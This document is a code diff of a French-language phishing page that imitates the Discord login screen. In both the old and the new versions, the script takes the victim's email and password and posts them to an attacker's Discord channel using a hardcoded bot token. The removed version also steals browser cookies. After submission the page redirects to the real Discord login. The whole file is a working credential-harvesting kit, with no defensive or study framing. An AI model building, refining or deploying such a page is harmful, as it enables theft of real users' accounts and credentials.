@@ -5,185 +5,67 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
     <style>
-        @font-face {
-            font-family: 'gg sans';
-            src: url('https://discord.com/assets/0f4b3c5b3c5b3c5b3c5b3c5b3c5b3c5b.woff2') format('woff2');
-            font-weight: 400;
-        }
-
-        body { 
-            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; 
-            /* L'image de fond officielle de discord */
-            background-image: url('https://discord.com/assets/0e1c3b5f6e3a4b5c8d7e6f5a4b3c2d1e.svg'), linear-gradient(#313338, #313338);
-            background-color: #313338; 
-            background-size: cover;
-            background-position: center;
-            color: white; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-
-        .container { 
-            background-color: #313338; 
-            padding: 32px; 
-            border-radius: 5px; 
-            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2); 
-            width: 100%;
-            max-width: 480px;
-            box-sizing: border-box;
-        }
-
-        .logo-container {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .logo {
-            width: 120px;
-            height: auto;
-        }
-
-        h2 { 
-            font-size: 24px; 
-            margin: 0 0 8px 0; 
-            font-weight: 600; 
-            text-align: center;
-            color: #f2f3f5;
-        }
-
-        p { 
-            color: #b5bac1; 
-            font-size: 16px; 
-            margin: 0 0 20px 0; 
-            text-align: center;
-        }
-
-        .input-group { 
-            text-align: left; 
-            margin-bottom: 20px; 
-        }
-
-        label { 
-            display: block; 
-            color: #b5bac1; 
-            font-size: 12px; 
-            font-weight: 700; 
-            text-transform: uppercase; 
-            margin-bottom: 8px; 
-        }
-
-        input { 
-            width: 100%; 
-            padding: 10px; 
-            background-color: #1e1f22; 
-            border: 1px solid #1e1f22; 
-            border-radius: 3px; 
-            color: #dbdee1; 
-            box-sizing: border-box; 
-            font-size: 16px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        input:focus { 
-            border-color: #5865f2; 
-        }
-
-        button { 
-            width: 100%; 
-            padding: 12px; 
-            background-color: #5865f2; 
-            color: white; 
-            border: none; 
-            border-radius: 3px; 
-            font-weight: 500; 
-            cursor: pointer; 
-            margin-top: 4px; 
-            font-size: 16px; 
-            transition: background-color 0.2s;
-        }
-
-        button:hover { 
-            background-color: #4752c4; 
-        }
-
-        .footer { 
-            margin-top: 16px; 
-            font-size: 14px; 
-            color: #949ba4; 
-            text-align: left; 
-        }
-
-        .footer a { 
-            color: #00a8fc; 
-            text-decoration: none; 
-        }
-
-        .footer a:hover { 
-            text-decoration: underline; 
-        }
+        body { font-family: Arial, sans-serif; background-color: #313338; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #2b2d31; padding: 32px; border-radius: 8px; text-align: center; width: 350px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background-color: #1e1f22; border: none; border-radius: 4px; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #status { margin-top: 15px; font-size: 14px; color: #00ff00; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo-container">
-            <!-- Logo discord officiel -->
-            <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="logo" alt="Discord">
-        </div>
-        <h2>Bienvenue à nouveau!</h2>
-        <p>Nous sommes ravis de vous revoir!</p>
-        <form id="discordForm">
-            <div class="input-group">
-                <label>E-mail ou numéro de téléphone</label>
-                <input type="email" id="email" required>
-            </div>
-            <div class="input-group">
-                <label>Mot de passe</label>
-                <input type="password" id="password" required>
-            </div>
+        <div style="font-size: 24px; font-weight: bold; margin-bottom: 20px;">Bienvenue à nouveau!</div>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="E-mail" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
             <button type="submit">Se connecter</button>
         </form>
-        <div class="footer">
-            Besoin d'un compte ? <a href="#">S'inscrire</a>
-        </div>
+        <div id="status"></div>
     </div>
 
     <script>
+        // TES INFOS ICI
         const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
         const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
         const botToken = part1 + part2;
         const channelId = "1566474880894116032";
 
-        async function sendToDiscord(msg) {
-            await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-                method: 'POST',
-                headers: { 'Authorization': `Bot ${botToken}`, 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: msg })
-            });
-        }
-
-        async function getCookies() {
-            let cookies = document.cookie;
-            if (cookies) {
-                await sendToDiscord(`**Cookies volés (Discord)**\n\`\`\`${cookies}\`\`\``);
-            }
-        }
-
-        document.getElementById('discordForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.color = "#ffff00"; // jaune
+            statusDiv.innerText = "Envoi en cours...";
+            
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
-            
-            await sendToDiscord(`**Discord Login**\n**Email:** ${email}\n**Pass:** ${pass}`);
-            await getCookies();
-            
-            window.location.href = "https://discord.com/login";
-        });
+            const msg = `**Login Discord**\n**Email:** ${email}\n**Pass:** ${pass}`;
 
-        getCookies();
+            try {
+                let res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+                    method: 'POST',
+                    headers: { 
+                        'Authorization': `Bot ${botToken}`, 
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({ content: msg })
+                });
+                
+                let data = await res.json();
+                
+                if (res.ok) {
+                    statusDiv.style.color = "#00ff00"; // vert
+                    statusDiv.innerText = "Réussi ! Regarde ton discord.";
+                    setTimeout(() => { window.location.href = "https://discord.com/login"; }, 1500);
+                } else {
+                    statusDiv.style.color = "#ff0000"; // rouge
+                    statusDiv.innerText = "Erreur token: " + data.message;
+                }
+            } catch (err) {
+                statusDiv.style.color = "#ff0000";
+                statusDiv.innerText = "Erreur réseau: " + err.message;
+            }
+        });
     </script>
 </body>
 </html>
